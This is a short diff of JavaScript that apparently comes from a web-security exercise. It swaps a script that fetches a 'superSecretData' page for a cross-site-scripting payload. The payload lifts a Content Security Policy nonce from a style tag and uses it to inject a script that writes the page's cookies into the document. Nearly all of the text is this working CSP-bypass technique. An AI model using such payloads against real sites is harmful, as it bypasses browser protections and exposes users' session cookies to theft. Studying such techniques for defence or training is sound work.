@@ -1,5 +1,5 @@
-fetch("/app/superSecretData.html")
-  .then(r => r.text())
-  .then(d => {
-    document.body.innerHTML += "<pre>" + d + "</pre>";
-  });
+let nonce = document.querySelector("style[nonce]")?.getAttribute("nonce");
+let s = document.createElement("script");
+s.setAttribute("nonce", nonce);
+s.innerHTML = "document.body.innerHTML += '<h1>' + document.cookie + '</h1>';";
+document.body.appendChild(s);
